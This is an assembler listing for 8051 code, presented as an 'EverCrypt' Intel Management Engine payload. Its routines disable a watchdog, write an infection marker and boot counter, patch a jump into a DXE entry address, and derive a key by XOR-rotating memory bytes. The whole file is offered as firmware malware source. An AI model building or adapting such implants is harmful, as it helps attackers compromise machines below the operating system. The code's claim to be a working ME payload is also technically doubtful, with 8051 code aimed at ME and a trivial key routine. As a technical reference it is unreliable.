                                      1 ;;; ===========================================================================
                                      2 ;;; EverCrypt Intel ME Payload - Minimal Working Version
                                      3 ;;; Assembler: sdas8051 (SDCC)
                                      4 ;;; ===========================================================================
                                      5 
                                      6         .module evercrypt_me
                                      7         
                                      8         .area   CSEG    (CODE)
                                      9         .area   GSINIT  (CODE)
                                     10         .area   GSFINAL (CODE)
                                     11 
                           000800    12 WDT_CTRL        =       0x0800
                           002000    13 HECI_CSR        =       0x2000
                           00FFF0    14 ME_SIG_ADDR     =       0xFFF0
                           00FFF8    15 ME_BOOT_CNT     =       0xFFF8
                           000000    16 DXE_ENTRY       =       0x0000
                           001300    17 HAP_BIT         =       0x1300
                                     18 
                                     19         .area   CSEG    (CODE)
                                     20 
      000000 02r00r30         [24]   21         ljmp    start
      000003                         22         .ds     0x2D
                                     23 
      000030                         24 start:
      000030 90 08 00         [24]   25         mov     dptr, #WDT_CTRL
      000033 E4               [12]   26         clr     a
      000034 F0               [24]   27         movx    @dptr, a
                                     28 
      000035r00r3D            [12]   29         acall   mark_infection
      000037r00r5E            [12]   30         acall   install_hooks
      000039r00r73            [12]   31         acall   derive_key
                                     32 
      00003B 80 FE            [24]   33         sjmp    .
                                     34 
      00003D                         35 mark_infection:
      00003D 90 FF F0         [24]   36         mov     dptr, #ME_SIG_ADDR
                                     37         
      000040 74 45            [12]   38         mov     a, #0x45
      000042 F0               [24]   39         movx    @dptr, a
      000043 A3               [24]   40         inc     dptr
      000044 74 43            [12]   41         mov     a, #0x43
      000046 F0               [24]   42         movx    @dptr, a
      000047 A3               [24]   43         inc     dptr
      000048 74 52            [12]   44         mov     a, #0x52
      00004A F0               [24]   45         movx    @dptr, a
      00004B A3               [24]   46         inc     dptr
      00004C 74 59            [12]   47         mov     a, #0x59
      00004E F0               [24]   48         movx    @dptr, a
      00004F A3               [24]   49         inc     dptr
      000050 74 50            [12]   50         mov     a, #0x50
      000052 F0               [24]   51         movx    @dptr, a
      000053 A3               [24]   52         inc     dptr
      000054 74 54            [12]   53         mov     a, #0x54
      000056 F0               [24]   54         movx    @dptr, a
                                     55 
      000057 90 FF F8         [24]   56         mov     dptr, #ME_BOOT_CNT
      00005A E0               [24]   57         movx    a, @dptr
      00005B 04               [12]   58         inc     a
      00005C F0               [24]   59         movx    @dptr, a
                                     60 
      00005D 22               [24]   61         ret
                                     62 
      00005E                         63 install_hooks:
      00005E 90 20 00         [24]   64         mov     dptr, #HECI_CSR
      000061 74 01            [12]   65         mov     a, #0x01
      000063 F0               [24]   66         movx    @dptr, a
                                     67 
      000064 90 00 00         [24]   68         mov     dptr, #DXE_ENTRY
      000067 74 EA            [12]   69         mov     a, #0xEA
      000069 F0               [24]   70         movx    @dptr, a
                                     71         
      00006A A3               [24]   72         inc     dptr
      00006B 74 00            [12]   73         mov     a, #0x00
      00006D F0               [24]   74         movx    @dptr, a
      00006E A3               [24]   75         inc     dptr
      00006F 74 10            [12]   76         mov     a, #0x10
      000071 F0               [24]   77         movx    @dptr, a
                                     78 
      000072 22               [24]   79         ret
                                     80 
      000073                         81 derive_key:
      000073 90 10 00         [24]   82         mov     dptr, #0x1000
      000076 78 30            [12]   83         mov     r0, #0x30
      000078 7F 20            [12]   84         mov     r7, #32
                                     85 
      00007A                         86 derive_loop:
      00007A E0               [24]   87         movx    a, @dptr
      00007B F6               [12]   88         mov     @r0, a
      00007C A3               [24]   89         inc     dptr
      00007D 08               [12]   90         inc     r0
      00007E DF FA            [24]   91         djnz    r7, derive_loop
                                     92 
      000080 78 30            [12]   93         mov     r0, #0x30
      000082 7F 20            [12]   94         mov     r7, #32
                                     95 
      000084                         96 mix_loop:
      000084 E6               [12]   97         mov     a, @r0
      000085 64 A5            [12]   98         xrl     a, #0xA5
      000087 23               [12]   99         rl      a
      000088 F6               [12]  100         mov     @r0, a
      000089 08               [12]  101         inc     r0
      00008A DF F8            [24]  102         djnz    r7, mix_loop
                                    103 
      00008C 22               [24]  104         ret
